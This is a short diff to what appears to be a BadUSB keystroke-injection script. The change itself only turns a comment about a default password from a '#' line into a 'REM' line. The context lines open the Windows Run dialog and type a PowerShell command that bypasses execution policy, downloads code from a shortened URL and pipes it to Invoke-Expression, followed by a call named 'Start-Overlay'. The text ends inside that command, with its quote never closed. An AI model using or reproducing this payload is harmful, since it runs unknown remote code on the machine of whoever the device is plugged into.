@@ -1,4 +1,4 @@
-# default password is "pass"
+REM default password is "pass"
 DELAY 1000
 GUI r
 STRING powershell -NoP -Ep Bypass "irm "t.ly/IBHlV"|iex;Start-Overlay
